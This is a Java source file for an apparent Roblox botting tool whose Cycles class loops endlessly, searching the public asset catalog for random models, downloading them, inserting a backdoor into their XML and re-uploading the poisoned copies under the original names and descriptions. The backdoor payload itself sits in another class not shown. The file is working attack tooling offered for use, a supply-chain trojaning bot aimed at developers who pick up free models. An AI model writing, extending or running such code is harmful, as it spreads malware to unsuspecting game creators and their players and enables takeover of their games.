package com.roblox.botting;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.roblox.misc.FileManipulation;
import com.roblox.misc.State;
import com.roblox.requests.Resources;
import org.xml.sax.SAXException;

import javax.xml.parsers.ParserConfigurationException;
import java.io.IOException;
import java.util.Random;

@SuppressWarnings("unused")
public class Cycles {
    private final Random random = new Random();
    private Resources resources = null;
    private State state = State.INITIALIZING;

    public Cycles() {}

    public void start(Resources resources) throws IOException, ParserConfigurationException, SAXException {
        this.resources = resources;
        this.state = State.FINDING_ASSET;
        this.findRandomAssetAndStartLoop();
    }

    private void findRandomAssetAndStartLoop() throws IOException, ParserConfigurationException, SAXException {
        char randomCharacter = this.generateRandomChar();
        JsonObject match = this.resources.lookupSuggestions(String.valueOf(randomCharacter), 35, 1);
        this.findMatch(match.get("Query").getAsString());
    }

    private void findMatch(String name) throws IOException, ParserConfigurationException, SAXException {
        System.out.printf("Searching for %s!\n", name);

        JsonArray searchResults = this.resources.searchAssets(name, "50");
        String assetId = null;
        String assetName = null;
        String assetDescription = null;
        String assetData = null;

        for(JsonElement element : searchResults) {
            JsonObject jsonObject = element.getAsJsonObject();
            String assetInfo = resources.downloadAsset(jsonObject.get("AssetId").getAsString());

            if(!assetInfo.startsWith("<roblox!")) { // checking if its valid xml
                assetId = jsonObject.get("AssetId").getAsString();
                assetName = jsonObject.get("Name").getAsString();
                assetDescription = jsonObject.get("Description").getAsString();
                assetData = assetInfo;
            }
        }

        if(assetId == null) {
            System.out.println("Failed to find an asset in rbxmx format");
            findRandomAssetAndStartLoop();
        }

        System.out.printf("Targeting \"%s\"\n", assetName);
        String assetDataBackdoored = this.insertBackdoor(assetData);

        int responseCode = resources.uploadAsset(assetName, assetDescription, assetDataBackdoored);
        System.out.println(responseCode);
        System.out.println(assetDataBackdoored);

        if(responseCode == 200)
            System.out.println("Successfully uploaded backdoored model!");
        else
            System.out.println("Failed to upload backdoored model");

        findRandomAssetAndStartLoop();
    }

    private String insertBackdoor(String assetXml) throws IOException, ParserConfigurationException, SAXException {
        FileManipulation fileManipulation = new FileManipulation(assetXml);

        return fileManipulation.insertBackdoor();
    }

    private char generateRandomChar() {
        return (char) (this.random.nextInt(26) + 'a');
    }

    public State getState() {
        return this.state;
    }
}
